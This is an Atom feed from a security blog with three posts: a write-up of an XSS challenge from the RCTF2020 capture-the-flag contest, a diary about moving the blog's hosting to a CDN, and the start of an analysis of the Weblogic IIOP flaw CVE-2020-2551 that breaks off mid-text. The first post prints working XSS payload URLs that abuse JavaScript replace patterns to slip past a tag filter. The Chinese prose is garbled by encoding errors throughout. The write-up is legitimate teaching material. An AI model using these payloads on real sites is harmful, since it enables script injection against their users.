<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Passer6y&#39;s Blog</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://0day.design/"/>
  <updated>2020-06-01T03:15:32.879Z</updated>
  <id>https://0day.design/</id>
  
  <author>
    <name>Passer6y</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>RCTF2020 Rblog WriteUp</title>
    <link href="https://0day.design/2020/06/01/RCTF-2020-WriteUp/"/>
    <id>https://0day.design/2020/06/01/RCTF-2020-WriteUp/</id>
    <published>2020-06-01T02:00:00.000Z</published>
    <updated>2020-06-01T03:15:32.879Z</updated>
    
    <content type="html"><![CDATA[<hr><a id="more"></a><p>é¢˜ç›®æ˜¯ä¸€ä¸ªç”¨æˆ·å¯ä»¥é€šè¿‡ä¼ å…¥æ­£åˆ™æ¥å¯¹é€‰å–æ–‡ç« å†…å®¹è¿›è¡Œé«˜äº®æ˜¾ç¤ºçš„åŠŸèƒ½ï¼š<br><img src="http://static-passer6y.d0g3.cn/0day/2020-06-01-15909777197138.jpg" alt="-w1290"></p><p>è¿‡æ­£åˆ™æ ¡éªŒï¼šä¸èƒ½æœ‰å°–æ‹¬å·ä¸”å­—ç¬¦ä¸èƒ½è¶…è¿‡36</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">highlight_word</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    u = <span class="keyword">new</span> URL(location)</span><br><span class="line">    hl = u.searchParams.get(<span class="string">'highlight'</span>) || <span class="string">''</span></span><br><span class="line">    <span class="keyword">if</span> (hl) &#123;</span><br><span class="line">        <span class="comment">// ban html tags</span></span><br><span class="line">        <span class="keyword">if</span> (hl.includes(<span class="string">'&lt;'</span>) || hl.includes(<span class="string">'&gt;'</span>) || hl.length &gt; <span class="number">36</span>) &#123;</span><br><span class="line">            u.searchParams.delete(<span class="string">'highlight'</span>)</span><br><span class="line">            history.replaceState(<span class="string">''</span>, <span class="string">''</span>, u.href)</span><br><span class="line">            alert(<span class="string">'âš ï¸ illegal highlight word'</span>)</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// why the heck this only highlights the first occurrence? stupid javascript ğŸ˜ </span></span><br><span class="line">            <span class="comment">// content.innerHTML = content.innerHTML.replace(hl, `&lt;b class="hl"&gt;$&#123;hl&#125;&lt;/b&gt;`)</span></span><br><span class="line">            hl_all = <span class="keyword">new</span> <span class="built_in">RegExp</span>(hl, <span class="string">'g'</span>)</span><br><span class="line">            replacement = <span class="string">`&lt;b class="hl"&gt;<span class="subst">$&#123;hl&#125;</span>&lt;/b&gt;`</span></span><br><span class="line">            post_content.innerHTML = post_content.innerHTML.replace(hl_all, replacement)</span><br><span class="line">            <span class="keyword">let</span> b = <span class="built_in">document</span>.querySelector(<span class="string">'b[class=hl]'</span>)</span><br><span class="line">            <span class="keyword">if</span> (b) &#123;</span><br><span class="line">                <span class="keyword">typeof</span> b.scrollIntoViewIfNeeded === <span class="string">"function"</span> ? b.scrollIntoViewIfNeeded() : b.scrollIntoView()</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>çœ‹æ–‡æ¡£ï¼š<br><a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/String/replace" target="_blank" rel="noopener">https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/String/replace</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">const newStr = str.replace(regexp|substr, newSubstr|function)</span><br></pre></td></tr></table></figure><p><code>str.replace</code>æœ‰ä»¥ä¸‹å‡ ç§ç‰¹æ®Šæ¨¡å¼ï¼š<br><img src="http://static-passer6y.d0g3.cn/0day/2020-06-01-15909777197169.jpg" alt="-w1078"></p><p><img src="http://static-passer6y.d0g3.cn/0day/2020-06-01-15909777197179.jpg" alt="-w1104"></p><p>ç¬¬ä¸€ç§ï¼šç”¨<code>$&amp;</code>å¼•ç”¨åŒ¹é…åˆ°çš„<code>&lt;</code>:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://120.79.152.66:65480/posts/6292038b-4fba-4344-af2a-6b92a788d606?highlight=.|$%26svg/onload=alert(1)+</span><br></pre></td></tr></table></figure></p><p><img src="http://static-passer6y.d0g3.cn/0day/2020-06-01-15909777197188.jpg" alt="-w1060"><br><img src="http://static-passer6y.d0g3.cn/0day/2020-06-01-15909777197197.jpg" alt="-w960"></p><p>ç¬¬äºŒç§ï¼šç”¨$`æ¥è·å–pæ ‡ç­¾å‰è¾¹çš„<code>&lt;</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://120.79.152.66:65480/posts/6292038b-4fba-4344-af2a-6b92a788d606?highlight=p|$`svg/onload=alert(1)+</span><br></pre></td></tr></table></figure></p><p><img src="http://static-passer6y.d0g3.cn/0day/2020-06-01-15909777197203.jpg" alt="-w402"></p><p>ç¬¬ä¸‰ç§ï¼š<code>$n</code><br>è¿™ç§å°±æ˜¯ç”¨çš„æœ€å¤šçš„å¼•ç”¨åŒ¹é…ï¼Œç¼ºç‚¹å°±æ˜¯éœ€è¦å¸¦æ‹¬å·</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://120.79.152.66:65480/posts/6292038b-4fba-4344-af2a-6b92a788d606?highlight=(.)|$1svg/onload=alert(1)+</span><br></pre></td></tr></table></figure><p><img src="http://static-passer6y.d0g3.cn/0day/2020-06-01-15909777197211.jpg" alt="-w1040"></p><p>æ¼æ´åˆ©ç”¨ï¼šé€šè¿‡<code>write(unescape(u))</code>æ¥å†™å…¥å½“å‰urlæ¥è¿›è¡Œä»»æ„ä»£ç æ‰§è¡Œï¼š<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://120.79.152.66:65480/posts/6292038b-4fba-4344-af2a-6b92a788d606?highlight=[$`style onload=write(unescape(u)) ]#?highlight=&lt;script&gt;alert(1)&lt;%2Fscript&gt;</span><br></pre></td></tr></table></figure></p><p><img src="http://static-passer6y.d0g3.cn/0day/2020-06-01-15909812953331.jpg" alt=""></p><p><a href="https://blog.cal1.cn/" target="_blank" rel="noopener">å®˜æ–¹è§£æ³•</a>é‡Œè¿˜æœ‰å‡ ä¸ªæœ‰æ„æ€çš„ç‚¹ï¼š<br>åœ¨feedbackæäº¤ç»™ç®¡ç†å‘˜ä¸èƒ½ç”¨<code>/</code><br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    axios.get(<span class="string">'?fetch'</span>).then(<span class="function"><span class="params">resp</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">let</span> i <span class="keyword">of</span> resp.data) &#123;</span><br><span class="line">            <span class="keyword">let</span> params = <span class="keyword">new</span> URLSearchParams()</span><br><span class="line">            params.set(<span class="string">'highlight'</span>, i.highlight_word)</span><br><span class="line">            <span class="keyword">if</span> (i.link.includes(<span class="string">'/'</span>) || i.link.includes(<span class="string">'\\'</span>)) &#123;</span><br><span class="line">                <span class="keyword">continue</span>; <span class="comment">// bye bye hackers uwu</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">let</span> a = <span class="built_in">document</span>.createElement(<span class="string">'a'</span>)</span><br><span class="line">            a.href = <span class="string">`<span class="subst">$&#123;i.link&#125;</span>?<span class="subst">$&#123;params.toString()&#125;</span>`</span></span><br><span class="line">            a.text = <span class="string">`<span class="subst">$&#123;i.ip&#125;</span>: <span class="subst">$&#123;a.href&#125;</span>`</span></span><br><span class="line">            feedback_list.appendChild(a)</span><br><span class="line">            feedback_list.appendChild(<span class="built_in">document</span>.createElement(<span class="string">'br'</span>))</span><br><span class="line">        &#125;</span><br><span class="line">        feedback_list.innerHTML = DOMPurify.sanitize(feedback_list.innerHTML)</span><br><span class="line">    &#125;, err =&gt; &#123;</span><br><span class="line">        feedback_list.innerText = err</span><br><span class="line">    &#125;)</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure></p><p>bypass:<br><img src="http://static-passer6y.d0g3.cn/0day/2020-06-01-15909812953340.jpg" alt=""><br><img src="http://static-passer6y.d0g3.cn/0day/2020-06-01-15909812953348.jpg" alt="-w936"></p><p>è†œhpdoger!!! è†œå‡ºé¢˜äºº</p>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
      <category term="CTF" scheme="https://0day.design/categories/CTF/"/>
    
    
      <category term="CTF" scheme="https://0day.design/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>åšå®¢ä¸Šäº‘ä¼˜åŒ–å°è®°</title>
    <link href="https://0day.design/2020/03/20/%E5%8D%9A%E5%AE%A2%E4%B8%8A%E4%BA%91%E5%B0%8F%E8%AE%B0/"/>
    <id>https://0day.design/2020/03/20/åšå®¢ä¸Šäº‘å°è®°/</id>
    <published>2020-03-20T04:03:00.000Z</published>
    <updated>2020-03-20T04:19:25.623Z</updated>
    
    <content type="html"><![CDATA[<hr><a id="more"></a><p><strong>å…ˆè¯´ç»“è®ºï¼Œåƒä¸‡åˆ«ç”¨åƒç‰›äº‘ï¼ï¼</strong></p><p><strong>ä¼˜åŒ–ç»“æœï¼š</strong>ä»ä»¥å‰çš„8ç§’éƒ½å‡ºä¸æ¥ï¼Œåˆ°ç°åœ¨ç§’å¼€ï¼š<br><img src="http://static-passer6y.d0g3.cn/0day/2020-03-20-15846769231873.jpg" alt="-w697"></p><p>æœ€å¼€å§‹æ˜¯è¿«äºå›¾åºŠéœ€æ±‚ï¼Œä¹‹å‰ä¸€ç›´ç”¨çš„<code>sm.ms</code>ï¼Œæœ€å¼€å§‹é€Ÿåº¦æ…¢å°±ç®—äº†ï¼Œå‡‘åˆç”¨ä¸€ä¸‹ï¼Œåˆ°åæ¥æŠŠæˆ‘ä¼ çš„å›¾ç‰‡banæ‰äº†ï¼Œå¯¼è‡´ä¹‹å‰å†™çš„æ–‡ç« å›¾ç‰‡å¤§é‡404ï¼Œå…³é”®æ˜¯é‡æ–°ä¼ ä¹Ÿä¼ ä¸ä¸Š..</p><p>åŠ ä¸Šæœ€è¿‘å†™äº†ä¸€ç¯‡å›¾ç‰‡è´¼å¤šçš„æ–‡ç« ï¼Œè®¿é—®é€Ÿåº¦å·¨æ…¢ï¼Œå¿ä¸ä½å°±å¼€å§‹æ‰¾å›¾åºŠã€‚</p><p>å¾ˆæ—©ä¹‹å‰çœ‹åˆ°åƒç‰›äº‘æ¯ä¸ªæœˆå…è´¹10G S3å¯¹è±¡å­˜å‚¨ï¼Œä½†æ˜¯è¦èº«ä»½è¯ç…§ç‰‡ï¼Œä¸€ç›´æç½®æ²¡ç”¨ï¼Œæ˜¨å¤©åˆ†æå®Œæ¼æ´æ— äº‹ï¼Œå°±ä¸€èµ·æŠŠä¹‹å‰åƒç°çš„åŸŸåéƒ½å®åäº†ã€‚</p><p>ä¹‹å‰ä¸€ç›´ä»¥ä¸ºæ»¡è¶³æˆ‘å›¾åºŠéœ€æ±‚çš„å…è´¹çš„10g s3èƒ½ä¸èŠ±é’±ï¼Œåæ¥åœ¨é…ç½®è¿‡ç¨‹ä¸­å‘ç°è¿™ç©æ„å¿…é¡»å’Œcdnæ†ç»‘ä½¿ç”¨ï¼Œå¥½äº†ï¼Œä¸ƒç‰›äº‘cdn httpå…è´¹10gæµé‡ï¼Œç”¨è¿‡github pageçš„éƒ½çŸ¥é“é…ç½®httpså°±æ˜¯ä¸€ä¸ªæŒ‰é’®çš„äº‹æƒ…ï¼Œä¸è¿‡é—®é¢˜ä¸å¤§ï¼Œhttpsçš„ç«™imgç”¨httpåŠ è½½ï¼Œå°±æ˜¯ä¸»é¡µæœ‰é”ï¼Œç‚¹è¿›æ–‡ç« å†…å®¹æ²¡é”çš„åŒºåˆ«ã€‚</p><p><img src="http://static-passer6y.d0g3.cn/0day/2020-03-20-15846769231570.jpg" alt="-w421"></p><p><img src="http://static-passer6y.d0g3.cn/0day/2020-03-20-15846769231579.jpg" alt="-w558"></p><p><img src="http://static-passer6y.d0g3.cn/0day/2020-03-20-15846769231597.jpg" alt="-w1132"></p><blockquote><p>ç”¨å›½å†…cdnæœ€éº»çƒ¦çš„åœ°æ–¹åœ¨äºè¦å¤‡æ¡ˆï¼Œè¿™é‡Œå¥½åœ¨ç™½å«–äº†ä¸€ä¸ªå°ç»„çš„d0g3.cnåŸŸåï¼Œçœå»äº†å¾ˆå¤šéº»çƒ¦ã€‚</p></blockquote><p>ä¼˜åŒ–å®Œå›¾ç‰‡åï¼Œè®¿é—®æ˜¯å¿«äº†å¾ˆå¤šï¼Œå½±å“åŠ è½½çš„ä¸»è¦å› ç´ å˜æˆäº†jså’Œcssï¼Œç„¶åæƒ³é¡ºæ‰‹æŠŠhexoçš„publicç›®å½•ç»™æ‹‰åˆ°s3ä¸Šã€‚</p><p>ç„¶åæˆ‘äººå‚»äº†ï¼Œä»–è¿™ä¸ªä¸èƒ½ä¸Šä¼ æ–‡ä»¶å¤¹å°±å¾ˆç¦»è°±ï¼š<br><img src="http://static-passer6y.d0g3.cn/0day/2020-03-20-15846769231606.jpg" alt="-w920"></p><p>ç„¶ååº·å¸ˆå‚…è®©æˆ‘ç”¨ftpä¼ ä¸Šå»(ä»–ç”¨çš„åˆæ‹äº‘)ï¼Œæ‰¾äº†åŠå¤©è¿æ¥å·¥å…·ï¼Œç„¶åæœæ€ä¹ˆç”¨ï¼š<br><img src="http://static-passer6y.d0g3.cn/0day/2020-03-20-15846769231645.jpg" alt="-w866"></p><p>ç»§ç»­æ‰¾è§£å†³åŠæ³•â€¦<br><img src="http://static-passer6y.d0g3.cn/0day/2020-03-20-15846769231653.jpg" alt="-w845"><br><img src="http://static-passer6y.d0g3.cn/0day/2020-03-20-15846769231661.jpg" alt="-w499"></p><p>æœ€åæ‰¾äº†ä¸ªä»–ä»¬æ¨å‡ºçš„<code>qshell</code>å‘½ä»¤è¡Œå·¥å…·ï¼Œæƒ³æƒ³ä¹Ÿç®—äº†ï¼Œ<code>hexo</code>ä¹Ÿè¦ç”¨å‘½ä»¤è¡Œï¼Œå°±æ— æ‰€è°“äº†ã€‚</p><p>æŠŠé™æ€èµ„æºåŒæ­¥ä¸Šå»ï¼Œå®Œäº†åœ¨nexté‡Œé…ç½®ä¸€ä¸‹ï¼š<br><img src="http://static-passer6y.d0g3.cn/0day/2020-03-20-15846769231669.jpg" alt="-w492"><br>ç»“æœåšå®¢æˆè¿™æ ·äº†ï¼š<br><img src="http://static-passer6y.d0g3.cn/0day/2020-03-20-15846769231678.jpg" alt="-w418"><br>å¯¹ï¼Œhttpsçš„ç«™åŠ è½½ä¸äº†httpçš„jsèµ„æºã€‚ã€‚</p><p>è¿™é‡Œä¸ºäº†ç™½å«–10gçš„http cdnæµé‡ï¼Œæˆ‘æŠŠhexoå…¨éƒ¨httpså…¨æ¢æˆäº†httpã€‚</p><p>æ”¹å®Œä¹‹åï¼Œè¿™é‡Œæœ‰ä¸ªå¾ˆä¸¥é‡çš„é—®é¢˜ï¼Œä»¥å‰æ‹¿httpsè®¿é—®è¿‡çš„ï¼Œä¹‹åæ‹¿httpè®¿é—®ï¼Œæµè§ˆå™¨ä¼šæœ‰ç¼“å­˜è‡ªåŠ¨è·³httpsï¼Œå¯æ˜¯æˆ‘ç«™å¼ºåˆ¶è®¿é—®httpså°±ä¼šåƒä¸Šå›¾é‚£æ ·ï¼Œæ²¡ğŸ”æ²¡jsã€‚ã€‚</p><p>è¿™é‡Œæˆ‘æƒ³äº†ä¸ªéªšä¸»æ„ï¼Œæ’äº†ä¸‹è¾¹ä¸€æ®µä»£ç æ”¾åœ¨äº†ä¸»é¡µï¼šå¼ºåˆ¶è·³è½¬æˆhttpâ€¦<br><img src="http://static-passer6y.d0g3.cn/0day/2020-03-20-15846769231702.jpg" alt="-w694"></p><p>æµ‹è¯•äº†ä¸€ä¸‹ï¼Œç»“æœå°±æ˜¯åœ¨chromeç¼“å­˜å’Œjsçš„åŒé‡åŠ æŒä¸‹ï¼Œhttp-&gt;https-&gt;httpï¼Œæ­»å¾ªç¯â€¦.</p><blockquote><p>è¿™é‡Œæ˜¯å…³äº†github pageçš„force httpsæµ‹è¯•çš„ï¼Œä¾æ—§å¦‚æ­¤â€¦</p></blockquote><p>å±ˆæœäº†ï¼Œæœ€åè¿˜æ˜¯é€‰æ‹©æ°ªé‡‘å§ï¼Œéƒ½èŠ±äº†è¿™ä¹ˆå¤šæ—¶é—´æŠ˜è…¾äº†ï¼Œä¸æƒ³æ¢å‚å•†äº†â€¦<br>CDNå’ŒS3åˆ†åˆ«æ”¶è´¹ï¼š<br><img src="http://static-passer6y.d0g3.cn/0day/2020-03-20-15846769231710.jpg" alt="-w954"><br><img src="http://static-passer6y.d0g3.cn/0day/2020-03-20-15846769231724.jpg" alt="-w689"><br>ä¸ºäº†èŠ‚çº¦æµé‡ï¼Œæˆ‘è¿˜åŠ äº†ä¸€ä¸ªè¿™ä¸ª<br><img src="http://static-passer6y.d0g3.cn/0day/2020-03-20-15846769231735.jpg" alt="-w702"><br>åæ¥@0akarmaå¸ˆå‚…ç»™æˆ‘è¯´ï¼Œè¿™äº›åœ¨åˆæ‹äº‘éƒ½æ˜¯å…è´¹çš„ï¼Œæˆ‘â€¦</p><p>å¥½äº†ï¼Œå…¨ç«™httpsä¹‹åï¼Œåˆæœ‰æ–°çš„é—®é¢˜äº†ï¼š<br><img src="http://static-passer6y.d0g3.cn/0day/2020-03-20-15846769231746.jpg" alt="-w1670"><br>woffç­‰å­—ä½“æ–‡ä»¶è¦é…ä¸€ä¸ªè·¨åŸŸèµ„æºå…±äº«(CORS)ï¼Œç„¶åå‡­ç€å°è±¡è®°å¾—S3å¯¹è±¡å­˜å‚¨é‚£æœ‰ä¸€ä¸ªèµ„æºå…±äº«é…ç½®ï¼š<br><img src="http://static-passer6y.d0g3.cn/0day/2020-03-20-15846769231754.jpg" alt="-w1469"></p><p>é…äº†ä¹‹åä»¥ä¸ºè¦å»¶è¿Ÿç”Ÿæ•ˆï¼Œå‡ºå»æ‰“äº†ä¸ªçƒå›æ¥ï¼Œè¿˜æ˜¯ä¸è¡Œï¼Œç„¶åç½‘ä¸Šæœäº†ä¸€ä¸‹ï¼š<br><img src="http://static-passer6y.d0g3.cn/0day/2020-03-20-15846769231788.jpg" alt="-w1077"><br>è¿™æ³¢æ“ä½œå±å®ç»™æˆ‘æ•´åäº†ï¼Œåœ¨ä¸ƒç‰›äº‘æ§åˆ¶å°è½¬äº†ä¸€å¤©ï¼Œä¹Ÿæ²¡çœ‹åˆ°CDNæœ‰è·¨åŸŸçš„é…ç½®ã€‚åæ¥æƒ³æƒ³ä¹Ÿç¡®å®å¾—åœ¨CDNçš„å“åº”ä¸Šé…ç½®ã€‚</p><p>åæ¥è¿˜é‡åˆ°å‡ ä¸ªå°é—®é¢˜ï¼Œwoffå­—ä½“çš„refereræ˜¯cssï¼Œè€Œä¸æ˜¯urlï¼Œè¿™é‡Œåœ¨é˜²ç›—é“¾refereræ ¡éªŒé‚£åŠ ä¸€ä¸ªç™½åå•å°±è¡Œäº†ï¼š<br><img src="http://static-passer6y.d0g3.cn/0day/2020-03-20-15846769231841.jpg" alt="-w719"></p><p>åˆ°ç°åœ¨ï¼Œå°±åªæœ‰htmlåœ¨githubä¸Šäº†ï¼Œæˆ‘è®¿é—®<a href="https://static-passer6y.d0g3.cn/ï¼Œä¸ä¹Ÿæ˜¯æˆ‘çš„åšå®¢å—ï¼Œä¸ºä»€ä¹ˆè¿˜è¦ç”¨github" target="_blank" rel="noopener">https://static-passer6y.d0g3.cn/ï¼Œä¸ä¹Ÿæ˜¯æˆ‘çš„åšå®¢å—ï¼Œä¸ºä»€ä¹ˆè¿˜è¦ç”¨github</a> pageå‘¢ï¼Œè€Œä¸”è¿˜è§£å†³äº†htmlåŠ è½½æ…¢çš„é—®é¢˜ã€‚</p><p>ç„¶åæˆ‘å°±æƒ³ç€å»åŠ ä¸€ä¸ª<code>@</code>çš„<code>cname</code>è§£æåˆ°<code>static-passer6y.d0g3.cn</code>ï¼Œåœ¨è¿™ä¹‹å‰æˆ‘é…äº†ä¸€ä¸ª<code>mx</code>çš„<code>@</code>è®°å½•ï¼Œç”¨æ¥æ”¶é‚®ä»¶çš„ã€‚</p><p>ä¸€æ³¢æ“ä½œä¸‹ï¼Œé˜¿é‡Œäº‘ä¸æ”¯æŒ@çš„cnameå’Œmxè®°å½•å…±å­˜â€¦<br><img src="http://static-passer6y.d0g3.cn/0day/2020-03-20-15846769231856.jpg" alt="-w433"></p><p><img src="http://static-passer6y.d0g3.cn/0day/2020-03-20-15846769231865.jpg" alt="-w943"></p><p>ç®—äº†ä¸æŠ˜è…¾äº†ï¼Œé™¤äº†htmlæ–‡ä»¶åœ¨githubä¸Šï¼Œå…¶ä»–çš„éƒ½ä¼˜åŒ–äº†ã€‚</p><p>æœ€åï¼ŒæŠ˜è…¾äº†å¤§åŠå¤©ï¼Œä¸ƒç‰›äº‘æ§åˆ¶å°ç»™ä¿ºæ•´åäº†ï¼Œäººç”Ÿå¿ å‘Šï¼Œåƒä¸‡åˆ«ç”¨<em>ä¸ƒç‰›äº‘</em>..</p><p>ç¬¬ä¸€æ¬¡ä¸Šäº‘çœŸé¦™ï¼Œå°±æ˜¯æµé‡æœ‰ç‚¹è´µã€‚<br><img src="http://static-passer6y.d0g3.cn/0day/2020-03-20-15846769231873.jpg" alt="-w697"></p>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
      <category term="Others" scheme="https://0day.design/categories/Others/"/>
    
    
      <category term="Others" scheme="https://0day.design/tags/Others/"/>
    
  </entry>
  
  <entry>
    <title>Weblogic IIOPååºåˆ—åŒ–æ¼æ´åˆ†æ(CVE-2020-2551)</title>
    <link href="https://0day.design/2020/03/19/Weblogic%20IIOP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    <id>https://0day.design/2020/03/19/Weblogic IIOPååºåˆ—åŒ–æ¼æ´åˆ†æ/</id>
    <published>2020-03-19T02:44:00.000Z</published>
    <updated>2020-03-19T12:47:56.506Z</updated>
    
    <content type="html"><![CDATA[<hr><a id="more"></a><h1 id="åŸºç¡€"><a href="#åŸºç¡€" class="headerlink" title="åŸºç¡€"></a>åŸºç¡€</h1><h2 id="IDLä¸Java-IDL"><a href="#IDLä¸Java-IDL" class="headerlink" title="IDLä¸Java IDL"></a>IDLä¸Java IDL</h2><p><strong>IDL</strong>ï¼ˆInterface Definition Languageï¼‰æ¥å£å®šä¹‰è¯­è¨€ï¼Œå®ƒä¸»è¦ç”¨äºæè¿°è½¯ä»¶ç»„ä»¶çš„åº”ç”¨ç¨‹åºç¼–ç¨‹æ¥å£çš„ä¸€ç§è§„èŒƒè¯­è¨€ã€‚å®ƒå®Œæˆäº†ä¸å„ç§ç¼–ç¨‹è¯­è¨€æ— å…³çš„æ–¹å¼æè¿°æ¥å£ï¼Œä»è€Œå®ç°äº†ä¸åŒè¯­è¨€ä¹‹é—´çš„é€šä¿¡ï¼Œè¿™æ ·å°±ä¿è¯äº†è·¨è¯­è¨€è·¨ç¯å¢ƒçš„è¿œç¨‹å¯¹è±¡è°ƒç”¨ã€‚</p><p><strong>JAVA IDL</strong>æ˜¯ä¸€ä¸ªåˆ†å¸ƒçš„å¯¹è±¡æŠ€æœ¯ï¼Œå…è®¸å…¶å¯¹è±¡åœ¨ä¸åŒçš„è¯­è¨€é—´è¿›è¡Œäº¤äº’ã€‚å®ƒçš„å®ç°æ˜¯åŸºäºå…¬å…±å¯¹è±¡ä»£ç†ä½“ç³»(Common Object Request Brokerage Architecture,CORBA)ï¼Œä¸€ä¸ªè¡Œä¸šæ ‡å‡†çš„åˆ†å¸ƒå¼å¯¹è±¡æ¨¡å‹ã€‚æ¯ä¸ªè¯­è¨€æ”¯æŒCORBAéƒ½æœ‰ä»–ä»¬è‡ªå·±çš„IDL Mappingæ˜ å°„å…³ç³»ï¼ŒIDLå’ŒJAVAçš„æ˜ å°„å…³ç³»å¯ä»¥å‚è€ƒæ–‡æ¡£<a href="https://docs.oracle.com/javase/8/docs/technotes/guides/idl/mapping/jidlMapping.html" target="_blank" rel="noopener">Java IDL: IDL to Java Language Mapping</a></p><blockquote><p>åœ¨jdkå®‰è£…åï¼Œä¼šé™„å¸¦æœ‰<code>idlj</code>ç¼–è¯‘å™¨ï¼Œä½¿ç”¨<code>idlj</code>å‘½ä»¤å¯ä»¥å°†IDLæ–‡ä»¶ç¼–è¯‘æˆjavaæ–‡ä»¶</p></blockquote><h2 id="COBAR"><a href="#COBAR" class="headerlink" title="COBAR"></a>COBAR</h2><p>CORBA(Common ObjectRequest Broker Architecture)å…¬å…±å¯¹è±¡è¯·æ±‚ä»£ç†ä½“ç³»ç»“æ„ï¼Œæ˜¯ç”±OMGç»„ç»‡åˆ¶è®¢çš„ä¸€ç§æ ‡å‡†åˆ†å¸ƒå¼å¯¹è±¡ç»“æ„ã€‚å…¶æå‡ºæ˜¯ä¸ºäº†è§£å†³ä¸åŒåº”ç”¨é—´çš„é€šä¿¡ï¼Œæ›¾æ˜¯åˆ†å¸ƒå¼è®¡ç®—çš„ä¸»æµæŠ€æœ¯ã€‚</p><p>CORBAç»“æ„åˆ†ä¸ºä¸‰éƒ¨åˆ†ï¼š</p><ul><li>naming service</li><li>client side </li><li>servant side</li></ul><p>ä»–ä»¬ä¹‹é—´çš„å…³ç³»ç®€å•ç†è§£ä¸ºï¼šclient sideä»naming serviceä¸­è·å–æœåŠ¡æ–¹servant sideä¿¡æ¯ã€‚servant sideéœ€è¦åœ¨naming serviceä¸­æ³¨å†Œï¼Œè¿™æ ·client sideåœ¨è¦è®¿é—®å…·ä½“å†…å®¹æ—¶ä¼šå…ˆå»naming serviceæŸ¥æ‰¾ï¼Œä»¥æ‰¾åˆ°å¯¹åº”çš„servant sideæœåŠ¡ã€‚</p><blockquote><p>å¯ä»¥ç†è§£ä¸ºç›®å½•ä¸ç« èŠ‚å…·ä½“å†…å®¹å…·ä½“å…³ç³»ï¼šnaming serviceç›®å½•ï¼Œservant sideä¸ºå†…å®¹ï¼Œç›®çš„å°±æ˜¯ä¸ºäº†è®©client sideå¿«é€Ÿä»ç›®å½•æ‰¾åˆ°å†…å®¹ã€‚</p></blockquote><h3 id="CORBAé€šä¿¡è¿‡ç¨‹"><a href="#CORBAé€šä¿¡è¿‡ç¨‹" class="headerlink" title="CORBAé€šä¿¡è¿‡ç¨‹"></a>CORBAé€šä¿¡è¿‡ç¨‹</h3><p>åœ¨CORBAå®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨ä¹‹é—´è¿›è¡Œè¿œç¨‹è°ƒç”¨æ¨¡å‹å¦‚ä¸‹ï¼š<br><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846051057378.jpg" alt=""></p><p>åœ¨å®¢æˆ·ç«¯ï¼Œåº”ç”¨ç¨‹åºåŒ…å«è¿œç¨‹å¯¹è±¡çš„å¼•ç”¨ï¼Œå¯¹è±¡å¼•ç”¨å…·æœ‰å­˜æ ¹(stub)æ–¹æ³•ï¼Œå­˜æ ¹æ–¹æ³•æ˜¯è¿œç¨‹è°ƒç”¨è¯¥æ–¹æ³•çš„æ›¿èº«ã€‚å­˜æ ¹å®é™…ä¸Šæ˜¯è¿æ¥åˆ°<strong>ORB</strong>(Object Request Broker)å¯¹è±¡è¯·æ±‚ä»£ç†çš„ï¼Œå› æ­¤è°ƒç”¨å®ƒä¼šè°ƒç”¨ORBçš„è¿æ¥åŠŸèƒ½ï¼Œè¯¥åŠŸèƒ½ä¼šå°†è°ƒç”¨è½¬å‘åˆ°æœåŠ¡å™¨ã€‚</p><p>åœ¨æœåŠ¡å™¨ç«¯ï¼ŒORBä½¿ç”¨æ¡†æ¶ä»£ç å°†è¿œç¨‹è°ƒç”¨è½¬æ¢ä¸ºå¯¹æœ¬åœ°å¯¹è±¡çš„æ–¹æ³•è°ƒç”¨ã€‚æ¡†æ¶å°†è°ƒç”¨å’Œä»»ä½•å‚æ•°è½¬æ¢ä¸ºå…¶ç‰¹å®šäºå®ç°çš„æ 